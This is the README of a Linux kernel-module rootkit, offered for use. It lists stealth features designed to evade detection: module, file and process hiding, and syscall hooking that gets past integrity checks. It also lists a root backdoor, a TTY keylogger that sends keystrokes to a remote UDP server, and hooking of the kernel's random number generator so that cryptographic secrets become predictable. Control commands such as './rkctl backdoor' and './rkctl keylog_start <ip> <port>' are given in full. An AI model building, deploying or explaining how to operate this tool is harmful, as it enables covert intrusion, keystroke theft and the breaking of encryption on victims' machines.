# LKM-TLSKIT

A Linux rootkit, based on a Linux Kernel Module.

> This rootkit has been developed on Linux kernel version 4.19.0-12-amd64
on Debian 10.6

## Features

* **Module hiding:** 

The kernel module is hidden from lsmod and /sys/module. This is done by remapping
the module's core layout such that the memory of the rootkit is unlinked from the kernel
module. It allows unloading the kernel module and destroying all the corresponding files,
while keeping the rootkit alive. This approach seems to be more stealthy than just hiding
the module via syscall hooking and removing the module from internal kernel lists.
     
* **SYSCALL hooking:**

The rootkit supports syscall hooking by redirecting syscalls from the user-space to 
a faked syscall table. In this ways, integrity checks on the syscall table will pass, since
the original syscall table will never be modified. In contrast, integrity checks on the
code itself will detect the rootkit, but due to runtime-patching of the kernel, 
this is more difficult to achieve.

The technique uses pattern matching on assembly code, starting at the address where the 
LSTAR MSR register points to (either entry_SYSCALL_64 or entry_SYSCALL_64_trampoline).

When the pattern matching fails (e.g. when different compiler versions are used that 
implements different optimizations) we will simply override the syscall table instead,
which is less stealthy and allows rootkit detection via syscall table integrity checks. 

* **File hiding:**

Files that contain the "user.rootkit" extended attribute are hidden from the user space
by hooking the getdents(64) syscall.

Extended attributes can be set via the *setfattr* tool.

* **Privilege Escalation via Backdoor:**

Execute an arbitrary program as root.

* **Process hiding:**

Process hiding is implemented by filtering the /proc directory. Tools, such as
*ps* will create a process list based on the files in /proc. Entries that corresponds to
hidden processes will be hidden from the directory.

* **Keylogger:**

A keylogger that hooks the tty->read function to receive all the input data from TTY/PTY
pseudoterminals, which is used for the user interface, ssh, docker, ...
The data will then be sent to an UDP server, control characters will be parsed to a specific string format.

* **CSPRNG hooking:**

The rootkit hooks the cryptographic secure pseudo random number generator (CSPRNG) from the
operating system and returns predictable random values, which allows the recalculation
of secrets generated by cryptographic libraries from the userspace (e.g. openssl). 
In case of Linux, this is */dev/random*, */dev/urandom* and the *getrandom()* syscall.

## Build dependencies

`apt-get install linux-headers-$(uname -r)`

## Build

A Makefile is provided for building the kernel module rootkit and its user-space
control program:

``make``

## Installation

The installation of the tlskit is done via the user-space control program.
See ***load*** and ***unload*** in the **Usage** section.

## Usage
The rootkit can be controlled via a user-space control program. 

The rootkit control program supports the following commands:

* ***Ping:*** 

    Check if the rootkit is currently alive: 

    ``./rkctl ping``

* ***Load:***

    Load the kernel module and install the rootkit: 

    ``./rkctl load <module.ko>``

* ***Unload:***

    Unload the rootkit: 

    ``./rkctl unload``
    
* ***Backdoor:***

    Run an arbitrary program as root (e.g. root shell via /bin/sh): 

    ``./rkctl backdoor <program>``
    
* ***Start Keylogger:***   
 
    Run an arbitrary program as root (e.g. root shell via /bin/sh): 

    ``./rkctl keylog_start <ip> <port>``

* ***Stop Keylogger:***

    Run an arbitrary program as root (e.g. root shell via /bin/sh): 

    ``./rkctl keylog_stop``
    
* ***Hide a Process:***

    Hide a process and all its successors by pid (can be testes by tools like *ps* or *top*): 

    ``./rkctl hidepid_add <pid>``
    
* ***Unhide a Process:***

    Unhide a hidden process and all its successors by pid: 

    ``./rkctl hidepid_rm <pid>``